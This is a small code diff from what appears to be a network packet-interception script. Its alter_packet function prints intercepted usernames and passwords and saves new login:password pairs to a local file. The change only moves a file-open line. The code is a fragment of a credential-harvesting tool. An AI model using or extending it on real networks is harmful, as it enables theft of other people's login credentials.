@@ -13,8 +13,8 @@ def alter_packet(pkt):
                 print("Catched username : " + login + " password : " + password)
 
                 #Write infos to save them
+                f = open("users-infos.txt", "a")
                 if str(login + ":" + password) not in open("users-infos.txt", "r").read():
-                    f = open("users-infos.txt", "a")
                     f.write(login + ":" + password + "\n") 
     
 
